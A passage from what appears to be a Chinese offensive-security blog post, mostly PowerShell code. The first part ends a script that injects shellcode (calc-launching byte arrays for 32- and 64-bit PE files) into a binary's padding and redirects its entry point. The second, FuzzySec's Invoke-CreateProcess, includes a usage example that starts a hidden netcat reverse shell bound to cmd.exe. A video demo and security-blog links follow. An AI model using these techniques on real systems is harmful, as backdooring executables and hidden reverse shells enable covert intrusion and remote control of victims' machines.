class="number">0</span>x61,<span class="number">0</span>x6C,<span class="number">0</span>x63,</span><br><span class="line">            <span class="number">0</span>x54,<span class="number">0</span>x59,<span class="number">0</span>x52,<span class="number">0</span>x51,<span class="number">0</span>x64,<span class="number">0</span>x8B,<span class="number">0</span>x72,<span class="number">0</span>x30,<span class="number">0</span>x8B,<span class="number">0</span>x76,<span class="number">0</span>x0C,<span class="number">0</span>x8B,</span><br><span class="line">            <span class="number">0</span>x76,<span class="number">0</span>x0C,<span class="number">0</span>xAD,<span class="number">0</span>x8B,<span class="number">0</span>x30,<span class="number">0</span>x8B,<span class="number">0</span>x7E,<span class="number">0</span>x18,<span class="number">0</span>x8B,<span class="number">0</span>x5F,<span class="number">0</span>x3C,<span class="number">0</span>x8B,</span><br><span class="line">            <span class="number">0</span>x5C,<span class="number">0</span>x1F,<span class="number">0</span>x78,<span class="number">0</span>x8B,<span class="number">0</span>x74,<span class="number">0</span>x1F,<span class="number">0</span>x20,<span class="number">0</span>x01,<span class="number">0</span>xFE,<span class="number">0</span>x8B,<span class="number">0</span>x54,<span class="number">0</span>x1F,</span><br><span class="line">            <span class="number">0</span>x24,<span class="number">0</span>x0F,<span class="number">0</span>xB7,<span class="number">0</span>x2C,<span class="number">0</span>x17,<span class="number">0</span>x42,<span class="number">0</span>x42,<span class="number">0</span>xAD,<span class="number">0</span>x81,<span class="number">0</span>x3C,<span class="number">0</span>x07,<span class="number">0</span>x57,</span><br><span class="line">            <span class="number">0</span>x69,<span class="number">0</span>x6E,<span class="number">0</span>x45,<span class="number">0</span>x75,<span class="number">0</span>xF0,<span class="number">0</span>x8B,<span class="number">0</span>x74,<span class="number">0</span>x1F,<span class="number">0</span>x1C,<span class="number">0</span>x01,<span class="number">0</span>xFE,<span class="number">0</span>x03,</span><br><span class="line">            <span class="number">0</span>x3C,<span class="number">0</span>xAE,<span class="number">0</span>xFF,<span class="number">0</span>xD7,<span class="number">0</span>x58,<span class="number">0</span>x58,<span class="number">0</span>x61)</span><br><span class="line">        &#125;</span><br><span class="line">        ElseIf(<span class="variable">$MagicVal</span> -eq <span class="string">"PE32+"</span>)&#123;</span><br><span class="line">            # 64-bit Universal WinExe (+ restore registers) --&gt; calc (by SkyLined)</span><br><span class="line">            # Size: 97 bytes</span><br><span class="line">            <span class="variable">$ShellCode</span> = @(<span class="number">0</span>x53,<span class="number">0</span>x56,<span class="number">0</span>x57,<span class="number">0</span>x55,<span class="number">0</span>x6A,<span class="number">0</span>x60,<span class="number">0</span>x5A,<span class="number">0</span>x68,<span class="number">0</span>x63,</span><br><span class="line">            <span class="number">0</span>x61,<span class="number">0</span>x6C,<span class="number">0</span>x63,<span class="number">0</span>x54,<span class="number">0</span>x59,<span class="number">0</span>x48,<span class="number">0</span>x29,<span class="number">0</span>xD4,<span class="number">0</span>x65,<span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x32,</span><br><span class="line">            <span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x76,<span class="number">0</span>x18,<span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x76,<span class="number">0</span>x10,<span class="number">0</span>x48,<span class="number">0</span>xAD,<span class="number">0</span>x48,<span class="number">0</span>x8B,</span><br><span class="line">            <span class="number">0</span>x30,<span class="number">0</span>x48,<span class="number">0</span>x8B,<span class="number">0</span>x7E,<span class="number">0</span>x30,<span class="number">0</span>x03,<span class="number">0</span>x57,<span class="number">0</span>x3C,<span class="number">0</span>x8B,<span class="number">0</span>x5C,<span class="number">0</span>x17,<span class="number">0</span>x28,</span><br><span class="line">            <span class="number">0</span>x8B,<span class="number">0</span>x74,<span class="number">0</span>x1F,<span class="number">0</span>x20,<span class="number">0</span>x48,<span class="number">0</span>x01,<span class="number">0</span>xFE,<span class="number">0</span>x8B,<span class="number">0</span>x54,<span class="number">0</span>x1F,<span class="number">0</span>x24,<span class="number">0</span>x0F,</span><br><span class="line">            <span class="number">0</span>xB7,<span class="number">0</span>x2C,<span class="number">0</span>x17,<span class="number">0</span>x8D,<span class="number">0</span>x52,<span class="number">0</span>x02,<span class="number">0</span>xAD,<span class="number">0</span>x81,<span class="number">0</span>x3C,<span class="number">0</span>x07,<span class="number">0</span>x57,<span class="number">0</span>x69,</span><br><span class="line">            <span class="number">0</span>x6E,<span class="number">0</span>x45,<span class="number">0</span>x75,<span class="number">0</span>xEF,<span class="number">0</span>x8B,<span class="number">0</span>x74,<span class="number">0</span>x1F,<span class="number">0</span>x1C,<span class="number">0</span>x48,<span class="number">0</span>x01,<span class="number">0</span>xFE,<span class="number">0</span>x8B,</span><br><span class="line">            <span class="number">0</span>x34,<span class="number">0</span>xAE,<span class="number">0</span>x48,<span class="number">0</span>x01,<span class="number">0</span>xF7,<span class="number">0</span>x99,<span class="number">0</span>xFF,<span class="number">0</span>xD7,<span class="number">0</span>x48,<span class="number">0</span>x83,<span class="number">0</span>xC4,<span class="number">0</span>x68,</span><br><span class="line">            <span class="number">0</span>x5D,<span class="number">0</span>x5F,<span class="number">0</span>x5E,<span class="number">0</span>x5B)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        # Inject all the things!</span><br><span class="line">        for($i=0; $i -lt $ShellCode.Length; $i++)&#123;</span><br><span class="line">            <span class="variable">$bytes</span>[(<span class="variable">$ShellCodeWrite</span> + <span class="variable">$i</span>)] = <span class="variable">$ShellCode</span>[<span class="variable">$i</span>]</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        # Set new Entry Point Offset --&gt; $NullCount</span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">19</span>)] = [byte](<span class="string">'0x'</span> + <span class="variable">$NullCount</span>.Substring(<span class="number">0</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">18</span>)] = [byte](<span class="string">'0x'</span> + <span class="variable">$NullCount</span>.Substring(<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">17</span>)] = [byte](<span class="string">'0x'</span> + <span class="variable">$NullCount</span>.Substring(<span class="number">4</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">16</span>)] = [byte](<span class="string">'0x'</span> + <span class="variable">$NullCount</span>.Substring(<span class="number">6</span>,<span class="number">2</span>))</span><br><span class="line">        </span><br><span class="line">        # Modified Entry Point</span><br><span class="line">        <span class="variable">$EntryPointOffset</span> = <span class="string">'&#123;0:X8&#125;'</span> -f (ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">19</span>)..(<span class="variable">$Opt</span>+<span class="number">16</span>)])</span><br><span class="line">        echo <span class="string">"Modified Entry Point Offset:     0x$EntryPointOffset"</span></span><br><span class="line">        </span><br><span class="line">        # Calculate &amp; append farJMP</span><br><span class="line">        <span class="variable">$Distance</span> = <span class="string">'&#123;0:x&#125;'</span> -f (<span class="variable">$EntryPointBefore</span> - (ConvertTo-Int <span class="variable">$bytes</span>[(<span class="variable">$Opt</span>+<span class="number">19</span>)..(<span class="variable">$Opt</span>+<span class="number">16</span>)]) - <span class="variable">$ShellCode</span><span class="selector-class">.Length</span> - <span class="number">5</span>)</span><br><span class="line">        echo <span class="string">"Inject Far JMP:                  0xe9$Distance"</span></span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$ShellCodeWrite</span> + <span class="variable">$ShellCode</span>.Length)] = <span class="number">0</span>xE9</span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$ShellCodeWrite</span> + <span class="variable">$ShellCode</span><span class="selector-class">.Length</span> + <span class="number">1</span>)] = [byte](<span class="string">'0x'</span> + <span class="variable">$Distance</span>.Substring(<span class="number">6</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$ShellCodeWrite</span> + <span class="variable">$ShellCode</span><span class="selector-class">.Length</span> + <span class="number">2</span>)] = [byte](<span class="string">'0x'</span> + <span class="variable">$Distance</span>.Substring(<span class="number">4</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$ShellCodeWrite</span> + <span class="variable">$ShellCode</span><span class="selector-class">.Length</span> + <span class="number">3</span>)] = [byte](<span class="string">'0x'</span> + <span class="variable">$Distance</span>.Substring(<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="variable">$bytes</span>[(<span class="variable">$ShellCodeWrite</span> + <span class="variable">$ShellCode</span><span class="selector-class">.Length</span> + <span class="number">4</span>)] = [byte](<span class="string">'0x'</span> + <span class="variable">$Distance</span>.Substring(<span class="number">0</span>,<span class="number">2</span>))</span><br><span class="line">        </span><br><span class="line">        # Hexdump of null-byte padding (after)</span><br><span class="line">        echo <span class="string">"`nNull-Byte Padding After:"</span></span><br><span class="line">        <span class="variable">$output</span> = <span class="string">""</span></span><br><span class="line">        foreach ( <span class="variable">$count</span> <span class="keyword">in</span> <span class="variable">$bytes</span>[(<span class="variable">$ShellCodeWrite</span> - <span class="number">1</span>)..(<span class="variable">$ShellCodeWrite</span>+<span class="number">504</span>)] ) &#123;</span><br><span class="line">            if (($output.length%32) -eq 0)&#123;</span><br><span class="line">                <span class="variable">$output</span> += <span class="string">"`n"</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$output</span> += <span class="string">"&#123;0:X2&#125; "</span> -f <span class="variable">$count</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; echo <span class="string">"$output`n"</span></span><br><span class="line">    </span><br><span class="line">        [System<span class="selector-class">.IO</span><span class="selector-class">.File</span>]::WriteAllBytes(<span class="variable">$Path</span>, <span class="variable">$bytes</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h3><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p>
+<script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
+<script>
+    var ivaInstance = new Iva('ivaLive', {
+        appkey: 'By9WGzBIx', //应用标示
+        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/Subvert-PE-shellcode.mp4', //视频
+        title: 'test', //视频标题，后台视频管理中的标题
+        cover: '' //视频封面，只有在autoplay:false才可生效
+    });
+</script>
+<script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>
+
+
+
+<h2 id="5-Invoke-CreateProcess-Powershell-弹计算器"><a href="#5-Invoke-CreateProcess-Powershell-弹计算器" class="headerlink" title="5.Invoke-CreateProcess (Powershell 弹计算器)"></a>5.Invoke-CreateProcess (Powershell 弹计算器)</h2><h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line">function Invoke-CreateProcess &#123;</span><br><span class="line">&lt;#</span><br><span class="line">.SYNOPSIS</span><br><span class="line">     -Binary            Full path of the module to be executed.</span><br><span class="line">                       </span><br><span class="line">     -Args              Arguments to pass to the module, e<span class="selector-class">.g</span>. <span class="string">"/c calc.exe"</span>. Defaults</span><br><span class="line">                        to <span class="variable">$null</span> <span class="keyword">if</span> not specified.</span><br><span class="line">                       </span><br><span class="line">     -CreationFlags     Process creation flags:</span><br><span class="line">                          <span class="number">0</span>x00000000 (NONE)</span><br><span class="line">                          <span class="number">0</span>x00000001 (DEBUG_PROCESS)</span><br><span class="line">                          <span class="number">0</span>x00000002 (DEBUG_ONLY_THIS_PROCESS)</span><br><span class="line">                          <span class="number">0</span>x00000004 (CREATE_SUSPENDED)</span><br><span class="line">                          <span class="number">0</span>x00000008 (DETACHED_PROCESS)</span><br><span class="line">                          <span class="number">0</span>x00000010 (CREATE_NEW_CONSOLE)</span><br><span class="line">                          <span class="number">0</span>x00000200 (CREATE_NEW_PROCESS_GROUP)</span><br><span class="line">                          <span class="number">0</span>x00000400 (CREATE_UNICODE_ENVIRONMENT)</span><br><span class="line">                          <span class="number">0</span>x00000800 (CREATE_SEPARATE_WOW_VDM)</span><br><span class="line">                          <span class="number">0</span>x00001000 (CREATE_SHARED_WOW_VDM)</span><br><span class="line">                          <span class="number">0</span>x00040000 (CREATE_PROTECTED_PROCESS)</span><br><span class="line">                          <span class="number">0</span>x00080000 (EXTENDED_STARTUPINFO_PRESENT)</span><br><span class="line">                          <span class="number">0</span>x01000000 (CREATE_BREAKAWAY_FROM_JOB)</span><br><span class="line">                          <span class="number">0</span>x02000000 (CREATE_PRESERVE_CODE_AUTHZ_LEVEL)</span><br><span class="line">                          <span class="number">0</span>x04000000 (CREATE_DEFAULT_ERROR_MODE)</span><br><span class="line">                          <span class="number">0</span>x08000000 (CREATE_NO_WINDOW)</span><br><span class="line">                        </span><br><span class="line">     -ShowWindow        Window <span class="attribute">display</span> flags:</span><br><span class="line">                          <span class="number">0</span>x0000 (SW_HIDE)</span><br><span class="line">                          <span class="number">0</span>x0001 (SW_SHOWNORMAL)</span><br><span class="line">                          <span class="number">0</span>x0001 (SW_NORMAL)</span><br><span class="line">                          <span class="number">0</span>x0002 (SW_SHOWMINIMIZED)</span><br><span class="line">                          <span class="number">0</span>x0003 (SW_SHOWMAXIMIZED)</span><br><span class="line">                          <span class="number">0</span>x0003 (SW_MAXIMIZE)</span><br><span class="line">                          <span class="number">0</span>x0004 (SW_SHOWNOACTIVATE)</span><br><span class="line">                          <span class="number">0</span>x0005 (SW_SHOW)</span><br><span class="line">                          <span class="number">0</span>x0006 (SW_MINIMIZE)</span><br><span class="line">                          <span class="number">0</span>x0007 (SW_SHOWMINNOACTIVE)</span><br><span class="line">                          <span class="number">0</span>x0008 (SW_SHOWNA)</span><br><span class="line">                          <span class="number">0</span>x0009 (SW_RESTORE)</span><br><span class="line">                          <span class="number">0</span>x000A (SW_SHOWDEFAULT)</span><br><span class="line">                          <span class="number">0</span>x000B (SW_FORCEMINIMIZE)</span><br><span class="line">                          <span class="number">0</span>x000B (SW_MAX)</span><br><span class="line">              </span><br><span class="line">     -StartF            Bitfield to influence window creation:</span><br><span class="line">                          <span class="number">0</span>x00000001 (STARTF_USESHOWWINDOW)</span><br><span class="line">                          <span class="number">0</span>x00000002 (STARTF_USESIZE)</span><br><span class="line">                          <span class="number">0</span>x00000004 (STARTF_USEPOSITION)</span><br><span class="line">                          <span class="number">0</span>x00000008 (STARTF_USECOUNTCHARS)</span><br><span class="line">                          <span class="number">0</span>x00000010 (STARTF_USEFILLATTRIBUTE)</span><br><span class="line">                          <span class="number">0</span>x00000020 (STARTF_RUNFULLSCREEN)</span><br><span class="line">                          <span class="number">0</span>x00000040 (STARTF_FORCEONFEEDBACK)</span><br><span class="line">                          <span class="number">0</span>x00000080 (STARTF_FORCEOFFFEEDBACK)</span><br><span class="line">                          <span class="number">0</span>x00000100 (STARTF_USESTDHANDLES)</span><br><span class="line">.DESCRIPTION</span><br><span class="line">  Author: Ruben Boonen (@FuzzySec)</span><br><span class="line">  License: BSD <span class="number">3</span>-Clause</span><br><span class="line">  Required Dependencies: None</span><br><span class="line">  Optional Dependencies: None</span><br><span class="line">.EXAMPLE</span><br><span class="line">  Start calc with NONE/SW_SHOWNORMAL/STARTF_USESHOWWINDOW</span><br><span class="line">  C:\PS&gt; Invoke-CreateProcess -Binary C:\Windows\System32\calc<span class="selector-class">.exe</span> -CreationFlags <span class="number">0</span>x0 -ShowWindow <span class="number">0</span>x1 -StartF <span class="number">0</span>x1</span><br><span class="line">  </span><br><span class="line">.EXAMPLE</span><br><span class="line">  Start nc reverse shell with CREATE_NO_WINDOW/SW_HIDE/STARTF_USESHOWWINDOW</span><br><span class="line">  C:\PS&gt; Invoke-CreateProcess -Binary C:\Some\Path\nc<span class="selector-class">.exe</span> -Args <span class="string">"-nv 127.0.0.1 9988 -e C:\Windows\System32\cmd.exe"</span> -CreationFlags <span class="number">0</span>x8000000 -ShowWindow <span class="number">0</span>x0 -StartF <span class="number">0</span>x1</span><br><span class="line">#&gt;</span><br><span class="line">  param (</span><br><span class="line">        [Parameter(Mandatory = <span class="variable">$True</span>)]</span><br><span class="line">    [string]<span class="variable">$Binary</span>,</span><br><span class="line">        [Parameter(Mandatory = <span class="variable">$False</span>)]</span><br><span class="line">    [string]<span class="variable">$Args</span>=<span class="variable">$null</span>,</span><br><span class="line">        [Parameter(Mandatory = <span class="variable">$True</span>)]</span><br><span class="line">    [Int]<span class="variable">$CreationFlags</span>,</span><br><span class="line">        [Parameter(Mandatory = <span class="variable">$True</span>)]</span><br><span class="line">    [Int]<span class="variable">$ShowWindow</span>,</span><br><span class="line">        [Parameter(Mandatory = <span class="variable">$True</span>)]</span><br><span class="line">    [Int]<span class="variable">$StartF</span></span><br><span class="line">  )  </span><br><span class="line">    # Define all the structures for CreateProcess</span><br><span class="line">  Add-Type -TypeDefinition @<span class="string">"</span></span><br><span class="line"><span class="string">  using System;</span></span><br><span class="line"><span class="string">  using System.Diagnostics;</span></span><br><span class="line"><span class="string">  using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  [StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">  public struct PROCESS_INFORMATION</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    public IntPtr hProcess;</span></span><br><span class="line"><span class="string">        public IntPtr hThread;</span></span><br><span class="line"><span class="string">        public uint dwProcessId;</span></span><br><span class="line"><span class="string">        public uint dwThreadId;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]</span></span><br><span class="line"><span class="string">  public struct STARTUPINFO</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    public uint cb;</span></span><br><span class="line"><span class="string">        public string lpReserved;</span></span><br><span class="line"><span class="string">        public string lpDesktop;</span></span><br><span class="line"><span class="string">        public string lpTitle;</span></span><br><span class="line"><span class="string">    public uint dwX;</span></span><br><span class="line"><span class="string">        public uint dwY;</span></span><br><span class="line"><span class="string">        public uint dwXSize;</span></span><br><span class="line"><span class="string">        public uint dwYSize;</span></span><br><span class="line"><span class="string">        public uint dwXCountChars;</span></span><br><span class="line"><span class="string">    public uint dwYCountChars;</span></span><br><span class="line"><span class="string">        public uint dwFillAttribute;</span></span><br><span class="line"><span class="string">        public uint dwFlags;</span></span><br><span class="line"><span class="string">        public short wShowWindow;</span></span><br><span class="line"><span class="string">    public short cbReserved2;</span></span><br><span class="line"><span class="string">        public IntPtr lpReserved2;</span></span><br><span class="line"><span class="string">        public IntPtr hStdInput;</span></span><br><span class="line"><span class="string">        public IntPtr hStdOutput;</span></span><br><span class="line"><span class="string">    public IntPtr hStdError;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  [StructLayout(LayoutKind.Sequential)]</span></span><br><span class="line"><span class="string">  public struct SECURITY_ATTRIBUTES</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    public int length;</span></span><br><span class="line"><span class="string">        public IntPtr lpSecurityDescriptor;</span></span><br><span class="line"><span class="string">        public bool bInheritHandle;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  public static class Kernel32</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    [DllImport("</span>kernel32.dll<span class="string">", SetLastError=true)]</span></span><br><span class="line"><span class="string">    public static extern bool CreateProcess(</span></span><br><span class="line"><span class="string">      string lpApplicationName,</span></span><br><span class="line"><span class="string">            string lpCommandLine,</span></span><br><span class="line"><span class="string">            ref SECURITY_ATTRIBUTES lpProcessAttributes, </span></span><br><span class="line"><span class="string">      ref SECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="line"><span class="string">            bool bInheritHandles,</span></span><br><span class="line"><span class="string">            uint dwCreationFlags, </span></span><br><span class="line"><span class="string">      IntPtr lpEnvironment,</span></span><br><span class="line"><span class="string">            string lpCurrentDirectory,</span></span><br><span class="line"><span class="string">            ref STARTUPINFO lpStartupInfo, </span></span><br><span class="line"><span class="string">      out PROCESS_INFORMATION lpProcessInformation);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">"</span>@</span><br><span class="line">  </span><br><span class="line">  # StartupInfo Struct</span><br><span class="line">  <span class="variable">$StartupInfo</span> = New-Object STARTUPINFO</span><br><span class="line">  $StartupInfo.dwFlags = $StartF # StartupInfo.dwFlag</span><br><span class="line">  $StartupInfo.wShowWindow = $ShowWindow # StartupInfo.ShowWindow</span><br><span class="line">  $StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size</span><br><span class="line">  </span><br><span class="line">  # ProcessInfo Struct</span><br><span class="line">  <span class="variable">$ProcessInfo</span> = New-Object PROCESS_INFORMATION</span><br><span class="line">  </span><br><span class="line">  # SECURITY_ATTRIBUTES Struct (Process &amp; Thread)</span><br><span class="line">  <span class="variable">$SecAttr</span> = New-Object SECURITY_ATTRIBUTES</span><br><span class="line">  <span class="variable">$SecAttr</span><span class="selector-class">.Length</span> = [System<span class="selector-class">.Runtime</span><span class="selector-class">.InteropServices</span><span class="selector-class">.Marshal</span>]::SizeOf(<span class="variable">$SecAttr</span>)</span><br><span class="line">  </span><br><span class="line">  # CreateProcess --&gt; lpCurrentDirectory</span><br><span class="line">  <span class="variable">$GetCurrentPath</span> = (Get-Item -Path <span class="string">".\" -Verbose).FullName</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  # Call CreateProcess</span></span><br><span class="line"><span class="string">  [Kernel32]::CreateProcess($Binary, $Args, [ref] $SecAttr, [ref] $SecAttr, $false, $CreationFlags, [IntPtr]::Zero, $GetCurrentPath, [ref] $StartupInfo, [ref] $ProcessInfo) |out-null</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  echo "</span>`nProcess Information:<span class="string">"</span></span><br><span class="line"><span class="string">  Get-Process -Id $ProcessInfo.dwProcessId |ft</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="如图所示"><a href="#如图所示" class="headerlink" title="如图所示"></a>如图所示</h3><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/9A727799-C49D-4D1E-B2E1-B44668E431E6.jpg" alt="enter description here"></p>
+<p>技术博客推荐：</p>
+<p>1.Google的Project Zero团队博客</p>
+<p><a href="https://googleprojectzero.blogspot.co.uk/" target="_blank" rel="noopener">https://googleprojectzero.blogspot.co.uk/</a></p>
+<p>2.NetSPI博客</p>
+<p><a href="https://blog.netspi.com/" target="_blank" rel="noopener">https://blog.netspi.com/</a></p>
+<p>3.html5安全备忘录</p>
+<p><a href="https://html5sec.org/" target="_blank" rel="noopener">https://html5sec.org/</a></p>
+<p>4.寻找内存中的.NET攻击</p>
+<p><a href="https://www.endgame.com/blog/technical-blog/hunting-memory-net-attacks" target="_blank" rel="noopener">https://www.endgame.com/blog/technical-blog/hunting-memory-net-attacks</a></p>
+<p>5.klion’s blog</p>
+<p><a href="https://klionsec.github.io/" target="_blank" rel="noopener">https://klionsec.github.io/</a></p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/每日安全干货及动态/" rel="tag">#每日安全干货及动态</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/NET-CS-calc.html" rel="prev">.NET_CSC_calc</a>
+            
+</div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/UltimateAppLockerByPassList.html" rel="next">Ultimate AppLocker ByPass List</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div>
+      
+        <style type="text/css">
+
+    .donate_bar {
+        text-align: center;
+        margin-top : 5%;
+    }
+
+    .donate_bar.hidden {
+        display:none;
+    }
+/*
+    .donate_bar a.btn_donate {
+        display: inline-block;
+        width: 82px;
+        height: 82px;
+        margin-left:auto;
+        margin-right:auto;
+
+        background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat;
+        _background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat; 
+
+        -webkit-transition: background 0s;
+        -moz-transition: background 0s;
+        -o-transition: background 0s;
+        -ms-transition: background 0s;
+        transition: background 0s;
+    }
+*/
+    .donate_bar a.btn_donate:hover { 
+        // background-position: 0px -82px;
+        color: #87daff
+    }
+
+    .donate_bar .donate_txt {
+        display: block;
+        color: #9d9d9d;
+        font: 14px/2 "Microsoft Yahei";
+    }
+
+    .bold { 
+        font-weight: bold; 
+    }
+
+    .post-donate a {
+        border-bottom: 0px;
+    }
+
+    #donate_guide table {
+        border: none;
+    }
+
+    #donate_guide td {
+        border-bottom: none;
+        border-right: none;
+        background: #333333;
+        valign: top;
+    }
+
+</style>
+
+
+
+    
+
+    <div class="post-donate">
+        <div id="donate_board" class="donate_bar center">
+              <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏">赏</a>
+              <span id="donate_txt" class="donate_txt">
+                   
+                        欢迎加入即刻安全和低调群
+                   
+              </span>
+            <br>
+        </div>  
+  
+        <div id="donate_guide" class="donate_bar center hidden">
+            <!--
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" 
+                    style="float:left;margin-left:25%;margin-right:10px;">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="" height="164px" width="164px">
+                </a> 
+              
+
+            
